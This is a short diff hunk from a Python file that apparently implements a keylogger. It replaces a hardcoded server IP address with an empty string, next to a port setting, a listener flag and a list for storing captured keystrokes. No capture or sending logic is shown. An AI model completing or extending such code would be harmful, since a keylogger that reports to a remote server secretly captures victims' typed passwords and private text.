@@ -4,7 +4,7 @@ import socket
 import threading
 import time
 
-SERVER = '100.84.214.3'
+SERVER = ''
 PORT = 9090
 listener_active = False
 keystrokes = []  # In-memory storage for keystrokes
